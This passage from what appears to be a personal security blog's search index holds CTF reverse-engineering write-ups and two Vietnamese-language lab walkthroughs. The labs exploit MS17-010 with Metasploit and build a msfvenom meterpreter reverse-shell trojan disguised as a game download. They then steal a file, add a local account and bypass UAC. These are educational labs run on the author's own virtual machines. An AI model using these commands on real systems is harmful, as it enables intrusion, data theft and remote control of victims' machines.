goodness! If I hadn\u0026rsquo;t discovered this by accident before the competition was over, I might have given up on forensics altogether.\nUMDCTF{1997_called_they_want_their_malware_back_bozo}\nConclusion In this competition, I think the forensics challenges were not too difficult overall (even the newbie-level could be accessed by around 7 out of 8 tasks). However, some tasks were overly reliant on guessing, which made it a bit frustrating for forensic enthusiasts.\nThanks to Hwi#9932 for helping me identify some misconceptions in the Telekinetic Warfare challenge and to everyone in BKSEC for constantly encouraging me to improve my skills in forensic challenges digital.\n","date":"2023-05-17T00:00:00Z","image":"/p/umdctf-2023-digital-forensics/featured_hu521915a03207d3ded912c6c781e96e24_122168_120x120_fill_box_smart1_3.png","permalink":"/p/umdctf-2023-digital-forensics/","title":"UMDCTF 2023 | Digital Forensics"},{"content":"Microsoft ❤️ Linux Microsoft’s latest addition to the world of Open Source: a flag checker…\nPart 1 analysis Check file \u0026ndash;\u0026gt; elf\ncheck the start function:\nSo easy to see in the loc_100063 stream along with the LINUX system commands, the conclusion is that that the input will be scanned 18 times (1 element each time) then stored in byte_100111, then rol with 0Dh (left shift 13 bits) and compaerd to byte_100210 (in the local)\nCheck byte_100210 (local):\n1 2 3 4 5 6 7 8 9 10 11 00100210 byte_100210 db 6Ch ; DATA XREF: start+1D↑r 00100211 dd offset byte_8E6C4EED 00100215 align 2 00100216 dd offset byte_4CAD666F 0010021A dd offset word_666C864E 0010021E dd offset byte_8E0F6685 00100222 dd offset word_2169633E 00100226 dd offset word_3C79553E 0010022A dd offset byte_3C786A63 0010022E dd offset dword_2C2C6538 00100232 dw 703Ch We can byte_100210: b'l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p'\nNow just write a scipt to find the original flag :333 (reverse the encoding of byte_100210 from the original flag):\nScript part 1 1 2 3 4 5 6 7 8 9 10 from pwn import ror input_data = b\u0026#39;l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p\u0026#39; shifted_data = bytearray() for byte in input_data: shifted_byte = ror(byte, 13, 8) shifted_data.append(shifted_byte) print(shifted_data.decode(\u0026#39;latin-1\u0026#39;)) And what we get is \u0026hellip;\ncorctf{3mbr4c3,3xtñ\\x1bK ñªËá\\x1bSÃáÁ+aaá\nIt seems like i can only get the first half of the flag, which isn\u0026rsquo;t easy by i can input it hix \u0026hellip;\nPart 2 analysis i will carefully check IDA again \u0026amp; see that between function start \u0026amp; byte_100111 along with byte_100210\n1 2 3 4 5 6 7 8 9 001000C2 dd offset dword_168D0AB4 001000C6 dd offset byte_6C60211 001000CA dd offset byte_C6FF0211 001000CE dw 1206h 001000D0 dd offset word_21CDFF02 001000D4 dd 0FE83F631h, 8A117412h, 34021384h, 229C8A0Dh, 75D83803h 001000D4 dd 0EAEB4609h, 33406C7h, 0DB310001h, 3E8309B4h, 74010334h 001000D4 dd 9F168D0Ah, 0B421CD03h, 8D21CD4Ch, 0CD033616h, 0CD4CB421h 00100110 db 21h Switching to reading the code, we get the following\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 001000C2 mov ah, 0Ah 001000C4 lea edx, [esi] 001000C6 adc [edx], eax 001000C8 mov byte ptr [esi], 11h 001000CB add bh, bh 001000CD mov byte ptr [esi], 12h 001000D0 add bh, bh 001000D2 int 21h ; DOS - BUFFERED KEYBOARD INPUT 001000D2 ; DS:DX -\u0026gt; buffer 001000D4 xor esi, esi 001000D6 001000D6 loc_1000D6: ; CODE XREF: 001000EA↓j 001000D6 cmp esi, 12h 001000D9 jz short loc_1000EC 001000DB mov al, [ebx+edx-75F2CBFEh] 001000E2 pushf 001000E3 and al, [ebx] 001000E5 cmp al, bl 001000E7 jnz short loc_1000F2 001000E9 inc esi 001000EA jmp short loc_1000D6 001000EC ; --------------------------------------------------------------------------- 001000EC 001000EC loc_1000EC: ; CODE XREF: 001000D9↑j 001000EC mov dword ptr [esi], 10334h 001000F2 001000F2 loc_1000F2: ; CODE XREF: 001000E7↑j 001000F2 xor ebx, ebx 001000F4 mov ah, 9 001000F6 cmp dword ptr [esi], 34h ; \u0026#39;4\u0026#39; 001000F9 add eax, [ecx] 001000FB jz short near ptr loc_100102+5 001000FD lea edx, [esi] 001000FF lahf 00100100 add ecx, ebp 00100102 00100102 loc_100102: ; CODE XREF: 001000FB↑j 00100102 and [esp+ecx*2+168D21CDh], esi 00100109 db 36h 00100109 add ecx, ebp Combined with assigning 0xd to edx, perhaps this half of the flag will do something with 0xd\nMaybe i though too much (just xor with 0xd)\nflag: corctf{3mbr4c3,3xt3nd,3Xt1ngu15h!!1}\nturbocrab Description: 🚀🚀 blazinglyer faster 🚀🚀 SHA256 hash of the flag: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nCheck the file Setup and run file:\nWhen i load turbocrab into IDA64\nLooking at this decompiled rust, I came up with the idea of ​​searching the string from the previous check flag section to find the function 🤡\nfunction turbocrab::execute_shellcode::h6984ce5848b31780:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void __cdecl turbocrab::execute_shellcode::h6984ce5848b31780(__u8_ shellcode) { __u8_ v1; // rdi __int64 v2; // r15 __int64 v3; // rdx usize v4; // [rsp+8h] [rbp-190h] u8 *v5; // [rsp+10h] [rbp-188h] usize len; // [rsp+20h] [rbp-178h] __int64 count; // [rsp+28h] [rbp-170h] core::ffi::c_void *src; // [rsp+30h] [rbp-168h] core::ffi::c_void *dst; // [rsp+48h] [rbp-150h] _BYTE v10[29]; // [rsp+63h] [rbp-135h] BYREF alloc::vec::Vec\u0026lt;u8,alloc::alloc::Global\u0026gt; self; // [rsp+80h] [rbp-118h] BYREF u8 *v12; // [rsp+98h] [rbp-100h] __int64 v13; // [rsp+A0h] [rbp-F8h] BYREF core::fmt::Arguments v14; // [rsp+A8h] [rbp-F0h] BYREF core::fmt::Arguments v15; // [rsp+D8h] [rbp-C0h] BYREF __u8_ v16; // [rsp+108h] [rbp-90h] core::ffi::c_void *v17; // [rsp+118h] [rbp-80h] __int64 *v18; // [rsp+130h] [rbp-68h] __int64 v19; // [rsp+138h] [rbp-60h] __int64 v20; // [rsp+140h] [rbp-58h] __int64 v21; // [rsp+148h] [rbp-50h] core::ffi::c_void *v22; // [rsp+150h] [rbp-48h] core::ffi::c_void *v23; // [rsp+158h] [rbp-40h] __int64 v24; // [rsp+160h] [rbp-38h] __int64 v25; // [rsp+168h] [rbp-30h] u8 *v26; // [rsp+170h] [rbp-28h] __int64 v27; // [rsp+178h] [rbp-20h] u8 *v28; // [rsp+180h] [rbp-18h] v16 = shellcode; v25 = 0LL; dst = mmap(0LL, shellcode.length, 3, 33, -1, 0LL); v17 = dst; qmemcpy(v10, \u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34;, sizeof(v10)); alloc::vec::from_elem::hba0d51ad3cb1207d(\u0026amp;self, 0, 0x4000uLL); v26 = alloc::vec::Vec$LT$T$C$A$GT$::as_ptr::h0252951c7d91d004(\u0026amp;self); v27 = 49602LL; v28 = v26 + 49602; v12 = v26 + 49602; src = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(shellcode); count = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); v22 = dst; v23 = src; v24 = count; core::intrinsics::copy::h46e3e522e297e890(src, dst, count); len = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); mprotect(dst, len, 5); v13 = v20; v18 = \u0026amp;v13; v1.data_ptr = v10; v1.length = 29LL; v5 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(v1); v1.data_ptr = v10; v1.length = 29LL; v4 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(v1); v2 = v12; v13 = (dst)(v10, 29LL, v3, dst, v5, v4); v12 = v2; v19 = v13; v21 = v13; if ( v13 == 1 ) core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v14, __PAIR128__(1LL, \u0026amp;stru_5620902FFF78), \u0026amp;stru_562090296240); else core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v15, __PAIR128__(1LL, \u0026amp;stru_5620902FFF68), \u0026amp;stru_562090296240); std::io::stdio::_print::hccc6c4adfff98fee(); core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h34608ea8b4b90afb(\u0026amp;self); } My conclusion here is:\nR^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P looks like it\u0026rsquo;s been encrypted\nshellcode and source dst are unknown v13 == 1 --\u0026gt; Correct! and vice versa\nDebugging Setup virtual machine for debugging with breakpoint set at v13 = (dst)(v10, 29LL, v3, dst, v5, v4);\nStep into continuously and when it comes to call close ptr unk_7F8C04CC62B2 there is a section LINUX-sys_read \u0026ndash;\u0026gt; Interrupt for input, we will see the section after that will have the input you entered and also the local encoding flag\nContinue and understand that the flow of the program is xor with 13 then sub with 1Eh (each character) like the asm fragment below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 zero:00007FE17840D120 loc_7FE17840D120: ; CODE XREF: zero:00007FE17840D06F↑j zero:00007FE17840D120 mov rax, r9 zero:00007FE17840D123 xor rax, r9 zero:00007FE17840D126 mov r9, rax zero:00007FE17840D129 mov al, [r8] zero:00007FE17840D12C mov r9b, al zero:00007FE17840D12F mov al, r9b zero:00007FE17840D132 xor al, 13h zero:00007FE17840D134 mov r9b, al zero:00007FE17840D137 pushfq zero:00007FE17840D138 mov al, r9b zero:00007FE17840D13B mov rbx, rax zero:00007FE17840D13E mov al, 80h zero:00007FE17840D140 mov rcx, 2 zero:00007FE17840D14A cmp rbx, rax zero:00007FE17840D14D jz short loc_7FE17840D158 zero:00007FE17840D14F sbb rcx, rcx zero:00007FE17840D152 and ecx, 0FFFFFFFDh zero:00007FE17840D155 add ecx, 4 zero:00007FE17840D158 zero:00007FE17840D158 loc_7FE17840D158: ; CODE XREF: zero:00007FE17840D14D↑j zero:00007FE17840D158 mov r14, rcx zero:00007FE17840D15B popfq zero:00007FE17840D15C mov rax, r14 zero:00007FE17840D15F and al, 4 zero:00007FE17840D161 test al, al zero:00007FE17840D163 jz short loc_7FE17840D16D zero:00007FE17840D165 mov al, r9b zero:00007FE17840D168 xor al, 37h zero:00007FE17840D16A mov r9b, al zero:00007FE17840D16D zero:00007FE17840D16D loc_7FE17840D16D: ; CODE XREF: zero:00007FE17840D163↑j zero:00007FE17840D16D mov al, r9b zero:00007FE17840D170 sub al, 1Eh zero:00007FE17840D172 mov r9b, al zero:00007FE17840D175 pushfq zero:00007FE17840D176 mov al, r9b zero:00007FE17840D179 mov rbx, rax zero:00007FE17840D17C mov al, 10h zero:00007FE17840D17E mov rcx, 2 zero:00007FE17840D188 cmp rbx, rax zero:00007FE17840D18B jz short loc_7FE17840D196 zero:00007FE17840D18D sbb rcx, rcx zero:00007FE17840D190 and ecx, 0FFFFFFFDh zero:00007FE17840D193 add ecx, 4 zero:00007FE17840D196 zero:00007FE17840D196 loc_7FE17840D196: ; CODE XREF: zero:00007FE17840D18B↑j zero:00007FE17840D196 mov r14, rcx zero:00007FE17840D199 popfq zero:00007FE17840D19A mov rax, r14 zero:00007FE17840D19D and al, 3 zero:00007FE17840D19F test al, al zero:00007FE17840D1A1 jz short loc_7FE17840D1AB zero:00007FE17840D1A3 mov al, r9b zero:00007FE17840D1A6 xor al, 31h zero:00007FE17840D1A8 mov r9b, al zero:00007FE17840D1AB zero:00007FE17840D1AB loc_7FE17840D1AB: ; CODE XREF: zero:00007FE17840D1A1↑j zero:00007FE17840D1AB mov al, r9b zero:00007FE17840D1AE mov [r8], al zero:00007FE17840D1B1 mov rax, [r15] zero:00007FE17840D1B4 add r15, 8 zero:00007FE17840D1B8 jmp rax Solve Script 1 2 3 encrypt = b\u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34; for i in encrypt: print(chr((i + 0x1e) ^ 0x13), end = \u0026#34;\u0026#34;) \u0026ndash;\u0026gt; corctf{xIG_j@t_vm_rBvBrs@ngN}\nIt seems that the flag still has no meaning, but now I notice the sha256 part in the Description: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nI can only think of one direction: bruteforce until the two sha256 codes are the same, then initial flag with some identifiable characteristics to save time such as: B can be 3, e or E and @ can be 1, i, I or !.\nBased on those, we can write a script to get the flag:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import hashlib target_hash = \u0026#34;dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\u0026#34; characters = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,.!?;:\u0026#39;-()[]{}\u0026lt;\u0026gt;\\/@#$%^\u0026amp;*_+=\u0026#34; guess1 = [\u0026#34;1\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;!\u0026#34;] guess2 = [\u0026#34;3\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;E\u0026#34;] for i in range(len(characters)): for j in range(len(characters)): for k in range(len(guess1)): for l in range(len(guess2)): for m in range(len(characters)): candidate = f\u0026#34;corctf{{x{characters[i]}{characters[j]}_j{guess1[k]}t_vm_r{guess2[l]}v{guess2[l]}rs{guess1[k]}ng{characters[m]}}}\u0026#34; hashed = hashlib.sha256(candidate.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() if hashed == target_hash: print(\u0026#34;Found:\u0026#34;, candidate) break flag:corctf{x86_j1t_vm_r3v3rs1ng?}\n","date":"2022-08-09T00:00:00Z","image":"/p/corctf-2022-reverse-engineering/featured-image_huc527355a429b7d0660ac9e16fd98331c_24593_120x120_fill_box_smart1_3.png","permalink":"/p/corctf-2022-reverse-engineering/","title":"CorCTF 2022 | Reverse Engineering"},{"content":"Tìm hiểu và thực hành tấn công với lỗ hổng MS17-010 (CVE-2017-0143)\nPhát hiện lỗ hổng MS17-010 1 2 Attacker: Kali Linux (192.168.47.128) Victim: Windows 7 (192.168.47.136) Trên máy victim ping tới IP attacker (192.168.47.128) và tương tự trên máy attacker cũng ping tới IP victim (192.168.47.136)\nTrên máy Attacker, sử dụng lệnh sudo nmap -sV -sC -O 192.168.47.136 để check các port đang mở trên máy victim cũng như dịch vụ và script trên các port này\nTại đây thấy port 445 đang mở (cổng 445 được dùng cho dịch vụ Server Message Block - smb truyền qua TCP)\nHoàn toàn có thể thấy script result bao gồm smb-os-discovery\n\u0026ndash;\u0026gt; Scan lỗ hổng trên giao thứ smb (tại port 445) bằng nmap: nmap --script vuln -p 445 192.168.47.136\nHoặc có thể sử dụng lệnh nmap -vv -Pn -T4 --script vuln 192.168.47.136 để quét full các cổng đang mở luôn cũng được\n(T: tượng trưng cho tốc độ quét \u0026ndash;\u0026gt; có 6 mốc quét từ 0 đến 5\n1 paranoid; sneaky; polite, nomal, aggressive, insane \u0026ndash;\u0026gt; tốc độ càng thấp độ an toàn càng cao, mức 3 sẽ là bthg, thi CTF dùng mức 4, thực tế dùng mức 1 (tránh bị hệ thống IDS phát hiện))\nIDS: Instrusion Detection System (Hệ thống phát hiện xâm nhập)\nTừ những dữ liệu trên, ta hoàn toàn có thể xác định được tồn tại lỗ hổng bảo mật MS17-010\nKhai thác lỗ hổng bảo mật MS17-010 Thực hiện truy cập vào máy victim Thực hiện mở Metasploit Framework và search ms17 để tìm các module liên quan\nexploit/windows/smb/ms17_010_eternalblue\nSau khi set module và rhost (remote), run để thiết lập SMB\nuse 0 \u0026ndash;\u0026gt; set rhost 192.168.47.136 (remote) \u0026ndash;\u0026gt; run\nĐến đây là đã khai thác thành công lỗ hổng MS17-010 để truy cập vào máy victim\nTruyền RAT Cách tạo ra 1 phần mềm RAT thì không khác gì như bài RAT (Remote Access Trojan) gì lắm, chỉ cần để ý hệ điêu hành chúng ta sử dụng làm victim trong chủ đề này là Windows 7 (x64) thì chúng ta cần tạo ra 1 file RAT tương ứng x64\nmsfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=192.168.199.139 lport=4444 -f exe --platform window \u0026gt; mal.exe Truyền RAT qua máy victim bằng lệnh upload + file\nSử dụng lệnh execute -f mal.exe -i -H để chạy file trên máy victim\nhoặc có thể truy cập vào shell và gọi file để chạy\nCheck trong Task Manager để thấy file mal.exe đang chạy\nKết luận Lỗ hổng bảo mật MS17-010 (CVE-2017-010) được đánh giá ở mức độ Critical (Nguy kịch) vì hoàn toàn có thể thực thi từ xa\nHệ điều hành bị ảnh hưởng bởi lỗ hổng bảo mật MS17-010 Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8.1, Windows Server 2012, 2012 R2, Windows RT 8.1, Windows 10, Windows Server 2016\n","date":"2021-12-12T00:00:00Z","image":"/p/ms17-010-cve-2017-0143/featured-image_hu69e7e51dfaf03e795a7783d1f5e83771_247169_120x120_fill_box_smart1_3.png","permalink":"/p/ms17-010-cve-2017-0143/","title":"MS17-010 (CVE-2017-0143)"},{"content":"Tìm hiểu và thực hành tấn công với Remote Access Trojan\nRAT là gì? RAT (Remote Access Trojan) là một loại phần mềm độc hại có thể giúp 1 tin tặc có thể chiếm quyền vào các điện thoại hoặc máy tính khi bị lây nhiễm.\nRAT được sử dụng hầu hết cho việc hack của các tin tặc và được cài trên máy của nạn nhân (victim). Nếu được mã hoá thì RAT sẽ được ẩn đi và rất khó cho các phần mềm diệt virus phát hiện được chúng. Bởi vì vậy càng khiến việc loại bỏ trở nên khó khăn cũng như các tin tặc dễ dàng kiểm soát thiết bị của nạn nhân hơn.\nCác phần mềm RAT nguy hiểm ở chỗ, hiện nay nó đang được rao bán với tầm giá từ vài chục đến vài trăm đô la mỹ nên việc xử lý chúng trên diện rộng cũng trở nên khó khăn hơn.\nKhi nạn nhân bị nhiễm RAT, tin tặc có thể làm được gì? Lấy được toàn bộ dữ liệu (Data), password lưu trên máy của nạn nhân Truy cập camera (webcam), hiển thị vị trí, truy cập mic để nghe môi trường xung quanh, xem trực tiếp màn hình của nạn nhân (victim) Có quyền truy cập danh bạ, danh sách cuộc gọi hoặc tin nhắn Có thể cài thêm các virus (có thể là loại khác vào máy nạn nhân) Có thể lợi dụng quyền điều khiển máy của nạn nhân để thực hiện các hành vi phạm tội khác \u0026ndash;\u0026gt; Tất cả các quyền của nạn nhân làm được trên thiết bị của họ, tin tặc cũng đều có thể làm được với máy của họ (nạn nhân)\nYêu cầu mô phỏng Sử dụng 1 công cụ RAT (Remote Access Trojan) bất kì [Mô hình bao gồm 1 máy attacker và 1 máy victim]. Thực hiện cài đặt RAT vào máy tính victim sau đó thực hiện các hành vi:\nLấy file dữ liệu về (có thể dùng 1 file giả lập trong hệ thống) Tạo tài khoản người dùng có quyền administrator Lưu ý: Sử dụng giao diện dòng lệnh hoặc giao diện của công cụ RAT (lưu ý không sử dụng công cụ Remote Desktop hoặc SSH) Thực hiện mô phỏng Mô hình tấn công Bao gồm 1 máy attacker là Kali Linux và 1 máy victim (trong bài này mình sử dụng Windows XP và Windows 7)\nCông cụ RAT Chọn công cụ msfvenom (Metasploit Framework) để sử dụng cho việc tấn công mô phỏng này\nStart apache web server từ phía Kali Linux (attacker) bằng sudo apache2ctl start và tiếp theo là check IP từ Kali Linux\nVà những gì hiển thị trên IP này là toàn bộ dữ liệu có trong var/www/html bên phía Kali Linux, mình đã tạo 1 web giả mạo tải game\nTạo 1 payload và lưu vào file game.exe mà mình sẽ dùng bằng lệnh (Tạo file malware)\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.47.128 lport=443 -f exe -o game.exe Giải thích shell:\n-p là sử dụng payload windows/meterpreter/reverse_tcp\nlhost là IP address của máy attacker (l tượng trưng cho local)\nlport là cổng của máy attacker\n-f là format của file malware (ở đây mình để là exe)\n-o File output thực tế (mình để tên của file)\nTại đây dùng 1 máy Windows XP để làm máy victim và truy cập vào địa chỉ IP trên đã lấy từ Kali Linux ở trên tiến hành truy cập vào apache web server và vào mục game đã chứa web giả mạo của mình. Và sau khi tải về thì sẽ chứa file game.exe\nSử dụng giao diện của msf \u0026ndash;\u0026gt; msfconsole (Metasploit framework) và vào việc\nNhập lần lượt các dòng lệnh để cài đặt cho msf\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.47.128 set lport 443 run Các lệnh cài cho Metasploit\nVà sau khi máy victim chạy nó, msf sẽ tự hiện lên kết nối\nNhập help để biết thêm nhiều lệnh và công dụng trong đó (mình không để ý nên đã mất rất nhiều thời gian sử dụng shell bên victim để gửi tài liệu)\nThực hiện hành vi 1: Lấy file tài liệu về (một file giả lập bất kỳ trong hệ thống)\nGiả sử máy victim đang có 1 file txt chẳng hạn ở đây mình để là file dinhthaison.txt và mình để luôn ở Desktop cho nhanh nhé\nthì với lệnh dir, mình đã quét được các file đang tồn tại ngoài Desktop và có tồn tại file dinhthaison.txt\nSau đó chỉ cần nhập lệnh download dinhthaison.txt để tải về thôi\nThực hiện hành vi 2: Tạo 1 tài khoản người dùng có quyền administrator.\nSử dụng lệnh shell để truy cập vào cmd của máy victim, check user bằng lệnh net user, ở đây ta thấy mới có tài khoản ban đầu của máy là SUPPORT_388945a0\nTiến hành thêm tài khoản mới bằng cách nhập lệnh net user newaccount dinhthaison /add, trong đó newaccount là tên người dùng, còn dinhthaison là password\nNgoài lề Về RAT lần này, sau khi thử với windows 7 thì có trường hợp không được cấp quyền ad trong khi nhập meterpreter (và lý do chính là UAC chưa được bypass)\nNhưng khi mình thực thi thì hoàn toàn không gặp phải vấn đề này vì có lẽ windows XP không có UAC\nNếu gặp UAC từ các đời windows 7 trở lên thì sao? Vậy thì mình sẽ bypass UAC ngay trong máy attacker. Đầu tiên sẽ là check người dùng bằng getuid\nVới mỗi thông tin nhu này thì chưa chắc chắn được gì, có lẽ nên thử tiếp bằng getsystem\nVậy là đã bị fail. Sử dụng getsystem -h để hiển thị mục help\nSau khi sử dụng getsystem -t 1 trả về Access is denied\nVậy thì sẽ tiến hành bypass UAC để có quyền truy cập cho RAT, bằng cách sử dụng module từ Metasploit để bypass tính năng UAC trên Windows.\nĐầu tiên thì mình sẽ cần làm background cho session\nTiếp theo sẽ sử dụng lệnh use exploit/windows/local/bypassuac (lệnh này có thể tìm kiếm bằng việc search uac trong Metasploit) sau đó check options\nDễ thấy exploit target là windows x86 \u0026ndash;\u0026gt; nhập show targets để xem những mục tiêu\nVậy thì đến đây chúng ta sẽ set target cũng như session\nSau bước này chúng ta có thể run để bypass UAC\nSau khi check getuid và getsystem đều đã ra những thứ chúng ta cần\nVậy là đã thành công vượt qua được UAC và đã có quyền truy cập hệ thống\n\u0026ndash;\u0026gt; Hoàn thành challenge tìm hiểu và sử dụng RAT (Remote Access Trojan)\nCách phòng tránh RAT và tự bảo vệ chính mình trước RAT Không sử dụng các phần mềm Crack hoặc không download từ 1 nguồn không đáng tin cậy nào Không mở mail không xác định hoặc mở file đính kèm từ 1 mail không xác định Luôn cập nhật các bản vá hoặc phần mềm mới nhất từ trang chính thức của phần mềm đó (cũng như hệ điều hành) Thao tác các hành động không đáng tin cậy trên máy ảo Về Windows đời cao hơn Đối với hệ điều hành Windows đời cao hơn, sẽ cần phải tắt tưởng lửa, window defender và tất nhiên cũng sẽ phải bypass UAC mới có thể sử dụng được và sự mô phỏng này có lẽ chưa thực sự khả thi với ngoài đời trong thời điểm hiện tại.\n","date":"2021-12-08T00:00:00Z","image":"/p/remote-access-trojan-rat/featured-image_hu5d81229f77d95ff6b8ef09734888b519_23752_120x120_fill_box_smart1_3.png","permalink":"/p/remote-access-trojan-rat/","title":"Remote Access Trojan (RAT)"}]